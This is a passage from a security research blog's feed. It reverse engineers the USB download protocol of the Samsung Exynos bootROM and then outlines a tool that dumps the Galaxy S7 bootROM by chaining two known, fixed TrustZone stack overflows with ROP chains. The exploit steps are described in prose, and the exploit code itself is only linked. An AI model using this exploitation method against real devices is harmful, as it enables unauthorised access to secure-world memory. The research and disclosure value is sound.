  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;evtCnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="c1"&gt;//read pending events count from DWC3_GEVNTCOUNT register&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evtCnt&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// loop while pending events available&lt;/span&gt;
      &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USBBuffers_ptr&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// read event from event buffer&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// evt.is_devspec == 0 : event is endpoint-specific&lt;/span&gt;
          &lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x1f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// extract endpoint_number from event&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// endpoint 0 (bit 0 of endpoint_number is direction: 0=&amp;gt;OUT, 1=&amp;gt;IN)&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_ep0_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
          &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;//other endpoints&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_ep_event&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;epNum&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),(&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xf&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// evt.is_devspec == 1 : event is device-specific&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xfe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;usb_handle_device_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;usbEventIdx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x1f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="n"&gt;write_DWC3_GEVNTCOUNT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;evtCnt&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instead of relying on interrupts like in Linux driver, this handler implements a polling loop to check for new events in event buffer. Then, events are dispatched to three different functions depending on their type :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;usb_handle_device_event&lt;/em&gt; : device-level events like (dis)connect USB cable, reset, link status change,...&lt;/li&gt;
&lt;li&gt;&lt;em&gt;usb_handle_ep0_event&lt;/em&gt; : default control endpoint 0 to enumerate &amp;amp; configure device&lt;/li&gt;
&lt;li&gt;&lt;em&gt;usb_handle_ep_event&lt;/em&gt; : dispatch events related to other endpoints, including bulk endpoints&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The latter &lt;em&gt;usb_handle_ep_event&lt;/em&gt; is the one we're interested in, because it handles data received from USB host (i.e. bootloader image).
In this function, a dispatch table calls a handler specific to each endpoint number. The only implemented handler in this table is for endpoint 2.
Based on configuration descriptors detailed above, we can confirm that endpoint 2 is for BULK OUT (host to device) transfers.&lt;/p&gt;
&lt;h2&gt;Transfer Request Blocks&lt;/h2&gt;
&lt;p&gt;Events described in the previous sections are only 32-bit values, they don't contain payload data. Actual data transfers are setup using &lt;strong&gt;Transfer Request Blocks&lt;/strong&gt; (TRB)&lt;/p&gt;
&lt;p&gt;A TRB is a structure that directs the USB controller where to write (or read, depending on endpoint direction) data for the next transfer on a specific endpoint.
The buffer has to be DMA coherent memory directly accessible by both main CPU and USB controller.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/** struct dwc3_trb - transfer request block (hw format) */&lt;/span&gt;
&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_trb&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;bpl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer pointer (low)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;bph&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer pointer (high)&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// buffer len&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt;     &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// control bitfield&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Linux driver function &lt;em&gt;dwc3_ep0_start_trans&lt;/em&gt; is a good example of how to initiate a data transfer using a TRB :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;dwc3_ep0_start_trans&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u8&lt;/span&gt; &lt;span class="n"&gt;epnum&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dma_addr_t&lt;/span&gt; &lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_gadget_ep_cmd_params&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_trb&lt;/span&gt;         &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_ep&lt;/span&gt;          &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dep&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;dep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;eps&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;epnum&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="n"&gt;trb&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lower_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bph&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;upper_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf_dma&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;trb&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ctrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;[...]&lt;/span&gt;

    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;param0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;upper_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb_addr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;param1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lower_32_bits&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ep0_trb_addr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;dwc3_send_gadget_ep_cmd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dwc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dep&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, &lt;strong&gt;trb&lt;/strong&gt; structure is filled using buffer address and its size provided in function parameters. Then, &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt; command is issued to USB controller with TRB pointer and endpoint number as arguments.&lt;/p&gt;
&lt;p&gt;Back to bootROM code, identifying where TRBs are set is an important step towards our goal. It can lead us to buffers (corresponding to &lt;em&gt;buf_dma&lt;/em&gt; here) used for data transfers. Among them, we're especially interested in those used for endpoint 2 (BULK OUT), because they are read back by the code we're ultimately interested in : vendor-specific protocol handlers.&lt;/p&gt;
&lt;p&gt;Again, we rely on hardware register accesses performed by &lt;em&gt;dwc3_send_gadget_ep_cmd&lt;/em&gt; to locate bootROM functions that can send command &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Send USB command&lt;/h2&gt;
&lt;p&gt;In Linux driver, the function to send USB commands &lt;em&gt;dwc3_send_gadget_ep_cmd&lt;/em&gt; is the only one to access registers &lt;strong&gt;DWC3_DEPCMDPAR0&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMDPAR1&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMDPAR2&lt;/strong&gt;, &lt;strong&gt;DWC3_DEPCMD&lt;/strong&gt;. And so it is with bootROM. By comparing both, we can deduce the bootROM function prototype :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;usb_send_command&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;endpointNumber&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DWC3_DEPCMD_e&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;param0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;param1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here's the list of commands defined in Linux driver code :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/* Device Endpoint Command Register */&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_DEPSTARTCFG     (0x09 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_ENDTRANSFER     (0x08 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_UPDATETRANSFER  (0x07 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_STARTTRANSFER   (0x06 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_CLEARSTALL      (0x05 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETSTALL        (0x04 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_GETSEQNUMBER    (0x03 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_GETEPSTATE      (0x03 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETTRANSFRESOURCE   (0x02 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;span class="cp"&gt;#define DWC3_DEPCMD_SETEPCONFIG     (0x01 &amp;lt;&amp;lt; 0)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From there, we can explore all incoming function calls to &lt;em&gt;usb_send_command&lt;/em&gt; and use the command argument as hint to ease the reversing.&lt;/p&gt;
&lt;p&gt;As explained in previous section, we're especially interested in finding calls with command argument &lt;strong&gt;DWC3_DEPCMD_STARTTRANSFER&lt;/strong&gt;, because they setup the TRB for a specific endpoint. In case of endpoint 2 (BULK OUT), the TRB contains the buffer address where data received from USB host will be written to.&lt;/p&gt;
&lt;p&gt;With these last bits, we now have enough information to move on to the next level, our initial goal.&lt;/p&gt;
&lt;h1&gt;Protocol level&lt;/h1&gt;
&lt;p&gt;In previous sections, we collected the following information :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;interface configuration : USB interface class &lt;em&gt;bInterfaceClass&lt;/em&gt; is vendor-specific (0xff)&lt;/li&gt;
&lt;li&gt;endpoint configuration : endpoint 2 (BULK OUT) is expected to receive data.&lt;/li&gt;
&lt;li&gt;TRB setup for transfer buffer : we know where received data is stored.&lt;/li&gt;
&lt;li&gt;endpoint handlers : we identified the handler function for each endpoint.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The vendor-specific interface class indicates that endpoint handler implements a proprietary protocol. Fortunately, a very simple protocol designed to download a bootloader from USB host.&lt;/p&gt;
&lt;p&gt;The bootloader is encapsulated in a small structure &lt;em&gt;dldata_s&lt;/em&gt;, and sent through USB bulk transfers of 512 bytes. Maximum data size is 321536 bytes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dldata_s&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unknown0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// header(8) + data(n) + footer(2)&lt;/span&gt;
    &lt;span class="n"&gt;u_int8_t&lt;/span&gt;  &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;u_int16_t&lt;/span&gt; &lt;span class="n"&gt;unknown1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//footer&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Despite the lack of documentation for the USB controller, we extracted enough technical information from Linux kernel drivers to reverse engineer USB stack implemented in Exynos bootROM. We concluded that this stack implements a single, proprietary interface to download a bootloader from USB host.&lt;/p&gt;
&lt;p&gt;As a side note, the bootROM code we analyzed doesn't implement any mitigation technique. Probably because, at such early boot stage, performance is critical, MMU is disabled, and entropy is hard.&lt;/p&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="usb"></category><category term="reverse"></category><category term="ghidra"></category></entry><entry><title>exynos8890-bootrom-dump : dump Exynos 8890 bootROM from Samsung Galaxy S7</title><link href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html" rel="alternate"></link><published>2020-06-15T00:00:00-07:00</published><updated>2020-06-15T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-15:/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html</id><summary type="html">&lt;p&gt;This post introduces a tool to dump Samsung Galaxy S7 bootROM using known and fixed security vulnerabilities in Trustzone.&lt;/p&gt;
&lt;p&gt;The source code is &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump"&gt;available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Collect bootroms" src="https://fredericb.info/blog/exy-bootrom/Collect_bootroms.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Procedure&lt;/h1&gt;
&lt;p&gt;We use a Galaxy S7 phone, with ADB access and root privileges.&lt;/p&gt;
&lt;p&gt;BootROM code is at address 0x0, in Secure world.
The TEE …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post introduces a tool to dump Samsung Galaxy S7 bootROM using known and fixed security vulnerabilities in Trustzone.&lt;/p&gt;
&lt;p&gt;The source code is &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump"&gt;available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Collect bootroms" src="https://fredericb.info/blog/exy-bootrom/Collect_bootroms.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Procedure&lt;/h1&gt;
&lt;p&gt;We use a Galaxy S7 phone, with ADB access and root privileges.&lt;/p&gt;
&lt;p&gt;BootROM code is at address 0x0, in Secure world.
The TEE (Trusted Execution Environment) running on this target is Trustonic Kinibi.&lt;/p&gt;
&lt;p&gt;The approach is to escalate from Android to a Trusted driver and read secure memory at address 0x0.&lt;/p&gt;
&lt;p&gt;We reuse fixed security bugs that are publicly documented.
Two exploits are required, one to exploit a Trusted Application from Android, then a second to exploit a Trusted Driver.
Both are simple stack overflow bugs. In both cases, return address is overwritten to redirect code execution to a ROP chain.&lt;/p&gt;
&lt;h2&gt;Trusted application exploitation&lt;/h2&gt;
&lt;p&gt;This part has been described by David Berard (p0ly) in &lt;a href="https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html"&gt;very well-written article from Synacktiv&lt;/a&gt;.
His work provides a very valuable starting point: an exploit for a Trusted Application with an example ROP chain.&lt;/p&gt;
&lt;p&gt;We port the original exploit to our target (G930F), and then change the ROP chain.
This &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump/commit/7c5ac021adda8a4c7167e75f662b037ba7685341#diff-6ba3042607cf6d0399411c4c527da649R41"&gt;new ROP chain&lt;/a&gt; calls the vulnerable Trusted Driver to deliver the second exploit.&lt;/p&gt;
&lt;h2&gt;Trusted driver exploitation&lt;/h2&gt;
&lt;p&gt;The second bug has been disclosed in a &lt;a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf"&gt;great talk from Quarkslab at BlackHat 2019&lt;/a&gt;. It is a trivial stack overflow due to &lt;em&gt;memcpy&lt;/em&gt; operation, so exploiting it from the first ROP chain is straightforward.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump/commit/7c5ac021adda8a4c7167e75f662b037ba7685341#diff-6ba3042607cf6d0399411c4c527da649R104"&gt;ROP chain&lt;/a&gt; we execute in the context of the Trusted Driver does the following operations :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;map physical address of bootROM&lt;/li&gt;
&lt;li&gt;map shared (secure &amp;amp; non-secure) buffer we initially allocated on Android side&lt;/li&gt;
&lt;li&gt;copy mapped bootROM to shared buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally, bootROM code is accessible to our Android executable.&lt;/p&gt;
&lt;h1&gt;Resources&lt;/h1&gt;
&lt;p&gt;This work has been possible thanks to the following previous research :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c"&gt;Unbox Your Phone&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html"&gt;KINIBI TEE: TRUSTED APPLICATION EXPLOITATION&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.bluefrostsecurity.de/files/TEE.pdf"&gt;Exploiting Trusted Apps on Samsung’s TEE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf"&gt;BREAKING SAMSUNG'S ARM TRUSTZONE&lt;/a&gt;&lt;/li&gt;
